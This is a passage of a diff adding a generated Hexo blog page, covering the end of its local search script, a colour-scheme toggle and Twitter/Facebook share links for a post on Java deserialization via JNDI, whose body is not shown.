+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2F2023%2Fjava%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E4%25B9%258Bjndi%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/2023/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
